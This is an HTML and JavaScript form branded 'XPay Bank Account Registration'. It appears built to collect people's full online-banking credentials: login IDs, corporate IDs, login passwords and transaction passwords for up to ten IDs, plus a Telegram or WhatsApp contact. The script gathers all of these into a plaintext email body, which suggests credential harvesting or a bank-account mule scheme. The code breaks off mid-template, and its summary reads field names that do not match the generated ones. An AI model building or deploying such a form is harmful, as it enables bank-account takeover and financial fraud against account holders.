<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XPay Bank Account Registration</title>
  <style>
    /* KEEPING YOUR ORIGINAL THEME */
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0c0c0c, #1a1a1a, #2d2d2d, #1a1a1a, #0c0c0c);
      min-height: 100vh;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .form-container {
      background: linear-gradient(145deg, #1e1e1e, #0a0a0a);
      border-radius: 20px;
      padding: 40px;
      max-width: 1000px;
      width: 100%;
      position: relative;
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 20px 20px 60px #000, -20px -20px 60px #2a2a2a;
    }

    .logo {
      position: absolute;
      top: 30px;
      right: 40px;
      font-size: 36px;
      font-weight: bold;
      color: #fff;
    }
    .logo .x { color: #00d4ff; }

    h1 { color: #fff; font-size: 28px; margin-bottom: 10px; }
    .subtitle { color: #888; margin-bottom: 40px; font-size: 14px; }

    .section-title {
      color: #00d4ff;
      font-size: 18px;
      font-weight: 600;
      margin: 30px 0 20px 0;
      padding-bottom: 10px;
      border-bottom: 1px solid #333;
    }

    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
    .form-group { display: flex; flex-direction: column; }
    label { color: #ccc; margin-bottom: 8px; font-size: 14px; }

    input, select {
      background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
      border: 1px solid #333;
      border-radius: 10px;
      padding: 12px 16px;
      color: #fff;
      font-size: 14px;
    }

    input:focus, select:focus {
      outline: none;
      border-color: #00d4ff;
      box-shadow: 0 0 0 2px rgba(0,212,255,0.2);
    }

    input::placeholder {
      color: #666;
    }

    .id-section {
      background: rgba(0,212,255,0.05);
      border: 1px solid rgba(0,212,255,0.2);
      border-radius: 15px;
      padding: 20px;
      margin: 20px 0;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .checkbox-group input[type="checkbox"] {
      width: 18px;
      height: 18px;
      margin: 0;
      cursor: pointer;
    }

    .checkbox-group label {
      margin: 0;
      cursor: pointer;
    }

    .submit-btn {
      background: linear-gradient(135deg, #00d4ff, #0099cc);
      border: none;
      border-radius: 12px;
      padding: 15px 40px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);
      margin-top: 30px;
      width: 100%;
    }

    .submit-btn:hover {
      background: linear-gradient(135deg, #0099cc, #007aa3);
      box-shadow: 0 6px 20px rgba(0, 212, 255, 0.4);
      transform: translateY(-2px);
    }

    .submit-btn:active {
      transform: translateY(0);
    }

    .success-message {
      display: none;
      background: linear-gradient(135deg, #00d4aa, #00b393);
      padding: 15px;
      border-radius: 10px;
      color: white;
      text-align: center;
      margin-bottom: 20px;
      box-shadow: 0 4px 15px rgba(0, 212, 170, 0.3);
    }

    .hidden { display: none; }

    .file-drop-area {
      border: 2px dashed #333;
      border-radius: 15px;
      padding: 40px 20px;
      text-align: center;
      background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
      transition: all 0.3s ease;
      cursor: pointer;
    }

    .file-drop-area:hover, .file-drop-area.dragover {
      border-color: #00d4ff;
      background: rgba(0, 212, 255, 0.05);
    }

    .browse-btn {
      background: linear-gradient(135deg, #333, #555);
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      color: #fff;
      font-size: 14px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .browse-btn:hover {
      background: linear-gradient(135deg, #555, #777);
    }

    .file-list {
      margin-top: 15px;
    }

    .file-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: rgba(0, 212, 255, 0.1);
      border: 1px solid rgba(0, 212, 255, 0.3);
      border-radius: 8px;
      padding: 10px 15px;
      margin: 5px 0;
    }

    .file-name {
      color: #00d4ff;
      font-size: 14px;
    }

    .file-size {
      color: #888;
      font-size: 12px;
    }

    .remove-file {
      background: #ff4444;
      border: none;
      border-radius: 4px;
      color: white;
      padding: 4px 8px;
      font-size: 12px;
      cursor: pointer;
    }

    @media (max-width: 768px) {
      .form-container {
        padding: 30px 20px;
        margin: 10px;
      }
      .form-grid {
        grid-template-columns: 1fr;
      }
      .logo {
        position: static;
        text-align: center;
        margin-bottom: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="form-container">
    <div class="logo"><span class="x">X</span>Pay</div>
    <h1>Bank Account Registration</h1>
    <p class="subtitle">Streamlining your business expansion across districts</p>

    <div class="success-message" id="successMessage">
      Registration submitted successfully! You will receive a confirmation email shortly.
    </div>

    <form id="bankForm" onsubmit="handleSubmit(event)">
      <!-- Bank Information -->
      <div class="section-title">Bank Information</div>
      <div class="form-grid">
        <div class="form-group">
          <label for="bankName">Bank Name *</label>
          <input type="text" id="bankName" name="bankName" placeholder="e.g., State Bank of India" required>
        </div>

      <!-- KYC Documents -->
      <div class="section-title">KYC Documents</div>
      <div class="form-group" style="grid-column: 1 / -1;">
        <label for="kycDocuments">Upload KYC Documents</label>
        <div class="file-drop-area" id="fileDropArea">
          <input type="file" id="kycDocuments" name="kycDocuments" multiple accept="image/*,.pdf" style="display: none;">
          <div class="drop-message">
            <div style="font-size: 48px; color: #00d4ff; margin-bottom: 15px;">📁</div>
            <div style="font-size: 16px; margin-bottom: 10px;">Drag & Drop your files here</div>
            <div style="font-size: 14px; color: #888; margin-bottom: 15px;">or</div>
            <button type="button" class="browse-btn" onclick="document.getElementById('kycDocuments').click()">Browse Files</button>
            <div style="margin-top: 15px; font-size: 12px; color: #666;">
              Supported formats: JPG, PNG, PDF | Max size per file: 10MB
            </div>
          </div>
        </div>
        <div id="fileList" class="file-list"></div>
      </div>
        <div class="form-group">
          <label for="accountNumber">Bank Account Number *</label>
          <input type="text" id="accountNumber" name="accountNumber" placeholder="Account Number" required>
        </div>
        <div class="form-group">
          <label for="accountName">Account Name *</label>
          <input type="text" id="accountName" name="accountName" placeholder="Account Holder Name" required>
        </div>
        <div class="form-group">
          <label for="ifscCode">IFSC Code *</label>
          <input type="text" id="ifscCode" name="ifscCode" placeholder="e.g., SBIN0001234" required>
        </div>
      </div>

      <!-- Account Config -->
      <div class="section-title">Account Configuration</div>
      <div class="form-grid">
        <div class="form-group" id="idCountGroup">
          <label for="idCount">ID Count *</label>
          <select id="idCount" name="idCount" onchange="updateFormFields()" required>
            <option value="">Select ID Count</option>
            <option value="1">1 ID</option>
            <option value="2">2 IDs</option>
            <option value="3">3 IDs</option>
            <option value="4">4 IDs</option>
            <option value="5">5 IDs</option>
            <option value="6">6 IDs</option>
            <option value="7">7 IDs</option>
            <option value="8">8 IDs</option>
            <option value="9">9 IDs</option>
            <option value="10">10 IDs</option>
          </select>
        </div>
        <div class="form-group">
          <div class="checkbox-group">
            <input type="checkbox" id="checkerMaker" name="checkerMaker" onchange="updateFormFields()">
            <label for="checkerMaker">Checker Maker Account</label>
          </div>
        </div>
      </div>

      <!-- Checker Maker Configuration (shown only when checkbox is checked) -->
      <div id="checkerMakerConfig" class="hidden">
        <div class="form-grid">
          <div class="form-group">
            <label for="checkerCount">Number of Checker IDs *</label>
            <select id="checkerCount" name="checkerCount" onchange="updateFormFields()">
              <option value="">Select Checker Count</option>
              <option value="1">1 Checker ID</option>
              <option value="2">2 Checker IDs</option>
              <option value="3">3 Checker IDs</option>
              <option value="4">4 Checker IDs</option>
              <option value="5">5 Checker IDs</option>
            </select>
          </div>
          <div class="form-group">
            <label for="makerCount">Number of Maker IDs *</label>
            <select id="makerCount" name="makerCount" onchange="updateFormFields()">
              <option value="">Select Maker Count</option>
              <option value="1">1 Maker ID</option>
              <option value="2">2 Maker IDs</option>
              <option value="3">3 Maker IDs</option>
              <option value="4">4 Maker IDs</option>
              <option value="5">5 Maker IDs</option>
            </select>
          </div>
        </div>
      </div>

      <!-- Contact Information -->
      <div class="section-title">Contact Information</div>
      <div class="form-grid">
        <div class="form-group">
          <label for="telegramId">Telegram ID</label>
          <input type="text" id="telegramId" name="telegramId" placeholder="@username or phone number">
        </div>
        <div class="form-group">
          <label for="whatsappNumber">WhatsApp Number</label>
          <input type="tel" id="whatsappNumber" name="whatsappNumber" placeholder="+91XXXXXXXXXX">
        </div>
      </div>

      <!-- Dynamic Section -->
      <div id="loginCredentialsSection" class="dynamic-section"></div>

      <button type="submit" class="submit-btn">Submit Registration</button>
    </form>
  </div>

  <script>
    const idCount = document.getElementById("idCount");
    const checkerMaker = document.getElementById("checkerMaker");
    const loginCredentialsSection = document.getElementById("loginCredentialsSection");

    function createCheckerCredentialBlock(title, index) {
      return `
        <div class="id-section">
          <h4 style="color:#ff6b6b; margin-bottom:15px; padding: 10px; background: rgba(255, 107, 107, 0.1); border-radius: 8px;">🔍 ${title}</h4>
          <div class="form-grid">
            <div class="form-group">
              <label>Login ID *</label>
              <input type="text" name="checkerLoginId${index}" placeholder="Checker Login ID" required>
            </div>
            <div class="form-group">
              <label>User ID *</label>
              <input type="text" name="checkerUserId${index}" placeholder="Checker User ID" required>
            </div>
            <div class="form-group">
              <label>Corporate ID *</label>
              <input type="text" name="checkerCorporateId${index}" placeholder="Checker Corporate ID" required>
            </div>
            <div class="form-group">
              <label>Password *</label>
              <input type="password" name="checkerPassword${index}" placeholder="Checker Password" required>
            </div>
            <div class="form-group">
              <label>Transaction Password *</label>
              <input type="password" name="checkerTransactionPassword${index}" placeholder="Checker Transaction Password" required>
            </div>
            <div class="form-group">
              <label>Domain ID <small style="color: #888;">(if applicable)</small></label>
              <input type="text" name="checkerDomainId${index}" placeholder="Enter if applicable">
            </div>
          </div>
        </div>`;
    }

    function createMakerCredentialBlock(title, index) {
      return `
        <div class="id-section">
          <h4 style="color:#4ecdc4; margin-bottom:15px; padding: 10px; background: rgba(78, 205, 196, 0.1); border-radius: 8px;">🔧 ${title}</h4>
          <div class="form-grid">
            <div class="form-group">
              <label>Login ID *</label>
              <input type="text" name="makerLoginId${index}" placeholder="Maker Login ID" required>
            </div>
            <div class="form-group">
              <label>User ID *</label>
              <input type="text" name="makerUserId${index}" placeholder="Maker User ID" required>
            </div>
            <div class="form-group">
              <label>Corporate ID *</label>
              <input type="text" name="makerCorporateId${index}" placeholder="Maker Corporate ID" required>
            </div>
            <div class="form-group">
              <label>Password *</label>
              <input type="password" name="makerPassword${index}" placeholder="Maker Password" required>
            </div>
            <div class="form-group">
              <label>Transaction Password *</label>
              <input type="password" name="makerTransactionPassword${index}" placeholder="Maker Transaction Password" required>
            </div>
            <div class="form-group">
              <label>Domain ID <small style="color: #888;">(if applicable)</small></label>
              <input type="text" name="makerDomainId${index}" placeholder="Enter if applicable">
            </div>
          </div>
        </div>`;
    }

    function createCredentialBlock(title, index) {
      return `
        <div class="id-section">
          <h4 style="color:#00d4ff; margin-bottom:15px;">${title}</h4>
          <div class="form-grid">
            <div class="form-group">
              <label>Login ID *</label>
              <input type="text" name="loginId${index}" placeholder="Login ID" required>
            </div>
            <div class="form-group">
              <label>User ID *</label>
              <input type="text" name="userId${index}" placeholder="User ID" required>
            </div>
            <div class="form-group">
              <label>Corporate ID *</label>
              <input type="text" name="corporateId${index}" placeholder="Corporate ID" required>
            </div>
            <div class="form-group">
              <label>Password *</label>
              <input type="password" name="password${index}" placeholder="Login Password" required>
            </div>
            <div class="form-group">
              <label>Transaction Password *</label>
              <input type="password" name="transactionPassword${index}" placeholder="Transaction Password" required>
            </div>
            <div class="form-group">
              <label>Domain ID <small style="color: #888;">(if applicable)</small></label>
              <input type="text" name="domainId${index}" placeholder="Enter if applicable">
            </div>
          </div>
        </div>`;
    }

    function updateFormFields() {
      const checkerMakerChecked = checkerMaker.checked;
      const checkerCountEl = document.getElementById('checkerCount');
      const makerCountEl = document.getElementById('makerCount');
      const idCountGroup = document.getElementById('idCountGroup');
      const checkerMakerConfig = document.getElementById('checkerMakerConfig');
      
      loginCredentialsSection.innerHTML = "";
      
      if (checkerMakerChecked) {
        // Hide ID Count, show Checker Maker configuration
        idCountGroup.classList.add('hidden');
        checkerMakerConfig.classList.remove('hidden');
        document.getElementById('idCount').required = false;
        checkerCountEl.required = true;
        makerCountEl.required = true;
        
        const checkerCount = parseInt(checkerCountEl.value) || 0;
        const makerCount = parseInt(makerCountEl.value) || 0;
        
        if (checkerCount > 0 || makerCount > 0) {
          let credentialsHTML = '<div class="section-title">Login Credentials</div>';
          
          // Generate Checker credentials
          for (let i = 1; i <= checkerCount; i++) {
            credentialsHTML += createCheckerCredentialBlock(`Checker ID ${i}`, i);
          }
          
          // Generate Maker credentials
          for (let i = 1; i <= makerCount; i++) {
            credentialsHTML += createMakerCredentialBlock(`Maker ID ${i}`, i);
          }
          
          loginCredentialsSection.innerHTML = credentialsHTML;
        }
      } else {
        // Show ID Count, hide Checker Maker configuration
        idCountGroup.classList.remove('hidden');
        checkerMakerConfig.classList.add('hidden');
        document.getElementById('idCount').required = true;
        checkerCountEl.required = false;
        makerCountEl.required = false;
        
        const count = parseInt(idCount.value) || 0;
        if (count > 0) {
          let credentialsHTML = '<div class="section-title">Login Credentials</div>';
          for (let i = 1; i <= count; i++) {
            credentialsHTML += createCredentialBlock(`Login ID ${i}`, i);
          }
          loginCredentialsSection.innerHTML = credentialsHTML;
        }
      }
    }

    function handleSubmit(event) {
      event.preventDefault();
      
      const formData = new FormData(event.target);
      const data = {};
      
      // Collect form data
      for (let [key, value] of formData.entries()) {
        data[key] = value;
      }
      
      // Add checkbox value
      data.checkerMaker = document.getElementById('checkerMaker').checked;
      
      // Format email content
      let emailContent = `
New XPay Bank Account Registration

BANK INFORMATION:
- Bank Name: ${data.bankName}
- Account Number: ${data.accountNumber}
- Account Name: ${data.accountName}
- IFSC Code: ${data.ifscCode}

ACCOUNT CONFIGURATION:
- Account Type: ${data.checkerMaker ? 'Checker Maker Account' : 'Standard Account'}
${data.checkerMaker ? '' : `- ID Count: ${data.idCount}`}

CONTACT INFORMATION:
- Telegram ID: ${data.telegramId || 'Not provided'}
- WhatsApp Number: ${data.whatsappNumber || 'Not provided'}

LOGIN CREDENTIALS:
`;

      if (data.checkerMaker) {
        // Add checker/maker credentials
        emailContent += `
CHECKER CREDENTIALS:
- Login ID: ${data.loginIdChecker || 'Not provided'}
- User ID: ${data.userIdChecker || 'Not provided'}
- Corporate ID: ${data.corporateIdChecker || 'Not provided'}
- Password: ${data.passwordChecker || 'Not provided'}
- Transaction Password: ${data.transactionPasswordChecker || 'Not provided'}
- Domain ID: ${data.domainIdChecker || 'Not provided'}

MAKER CREDENTIALS:
- Login ID: ${data.loginIdMaker || 'Not provided'}
- User ID: ${data.userIdMaker || 'Not provided'}
- Corporate ID: ${data.corporateIdMaker || 'Not provided'}
- Password: ${data.passwordMaker || 'Not provided'}
- Transaction Password: ${data.transactionPasswordMaker || 'Not provided'}
- Domain ID: ${data.domainIdMaker || 'Not provided'}`;
      } else {
        // Add standard login credentials for each ID
        const idCount = parseInt(data.idCount) || 0;
        for (let i = 1; i <= idCount; i++) {
          emailContent += `
Login ID ${i}:
- Login ID: ${d
